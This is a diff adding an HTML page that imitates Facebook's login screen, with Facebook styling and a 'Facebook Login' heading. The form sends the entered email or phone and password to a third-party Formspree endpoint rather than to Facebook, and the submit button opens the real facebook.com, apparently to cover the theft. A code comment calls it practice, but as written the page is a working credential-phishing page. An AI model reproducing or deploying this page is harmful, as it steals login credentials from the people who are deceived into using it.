@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Form</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    form {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #1877f2; /* Facebook blue */
+      text-align: left;
+    }
+
+    input {
+      width: calc(100% - 20px);
+      padding: 12px; /* Increased padding for better visual */
+      margin-bottom: 15px;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      position: relative;
+    }
+
+    #showPasswordContainer {
+      position: relative;
+      margin-bottom: 15px;
+    }
+
+    #showPassword {
+      position: absolute;
+      right: 30px;
+      top: 39%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: rgb(0, 0, 0, .5); /* Facebook blue */
+      font-size: 18px;
+    }
+
+    button {
+      background-color: #1877f2; /* Facebook blue */
+      color: #fff;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+    }
+
+    button:hover {
+      background-color: #145293; /* Darker shade on hover */
+    }
+
+    /* Additional styles to make it look closer to Facebook */
+    h2 {
+      color: #1877f2; /* Facebook blue */
+      margin-bottom: 20px;
+    }
+
+    hr {
+      border: 0;
+      height: 1px;
+      background: #ccc;
+      margin-bottom: 20px;
+    }
+
+    p {
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+
+  <form id="loginForm" action="https://formspree.io/f/xgejbldd" method="post">
+    <h2>Facebook Login</h2>
+
+    <label for="username">Email or Phone:</label>
+    <input type="text" id="username" name="username" required>
+
+    <label for="password">Password:</label>
+    <div id="showPasswordContainer">
+      <input type="password" id="password" name="password" required>
+      <span id="showPassword" onclick="togglePasswordVisibility()"><i class="fa-regular fa-eye-slash"></i></span>
+    </div>
+
+    <button type="submit" onclick="window.open('http://www.facebook.com')">Log In</button>
+
+    <hr>
+
+    <p><a href="#">Forgotten password?</a></p>
+    <p><a href="#">Sign up for Facebook</a></p>
+  </form>
+
+  <script>
+    function submitForm() {
+      var username = document.getElementById("username").value;
+      var password = document.getElementById("password").value;
+
+      // Here you can send the login details to the server or perform any desired action
+      // For practice purposes, you can simply log the values to the console
+      console.log("Username or Email: " + username);
+      console.log("Password: " + password);
+    }
+
+    function togglePasswordVisibility() {
+      var passwordInput = document.getElementById("password");
+      var showPassword = document.getElementById("showPassword");
+
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        showPassword.innerHTML = `<i class="fa-regular fa-eye-slash"></i>`; // Unicode for up arrow icon
+      } else {
+        passwordInput.type = "password";
+        showPassword.innerHTML = `<i class="fa-regular fa-eye-slash"></i>`; // Unicode for down arrow icon
+      }
+    }
+  </script>
+
+</body>
+</html>
